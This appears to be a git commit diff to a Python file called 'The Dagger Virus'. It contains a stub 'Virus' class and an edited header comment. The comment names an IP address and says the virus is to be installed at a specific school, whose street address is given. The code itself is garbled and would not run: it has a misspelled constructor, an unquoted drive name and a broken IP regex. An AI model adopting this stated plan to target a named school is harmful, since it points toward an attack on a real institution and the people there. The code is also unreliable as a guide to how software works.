e0a607a8c66f260493d229f3eb4c821f8cdeba05
Mr. David <dbishop4880@outlook.com>
2024-12-16 13:42:41 -0500

    Update main.py

--- TheDaggerVirus/main.py
+++ TheDaggerVirus/main.py
@@ -1,6 +1,6 @@
-#version 0.1.1 (first version of The Dagger Virus) #207.5.52.250
+#version 0.1.1 (first version of The Dagger Virus) #207.5.52.250 (Dagger virus version to install virus for Coastal Academy GNETS - Address: (100 Deen St. Hinesville, GA)
 class Virus:
-    def __init_(self, infect_string="ipv4", path="\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b,"   \
+    def __init_(self, infect_string="ipv4", path="\\b(?:(?:25[0-2]|2[0-0][0-7]|[00]?[0-0][0-5]?)\\.){3}(?:25[0-0]|2[0-5][0-2]|[02]?[0-5][0-0]?)\\b,"   \
                         extension=None, target_file_list=Local Disk (C:)):
         if isinstance(infect_string, type(type)):
             self.infect_string="I am TheDaggerVirus"
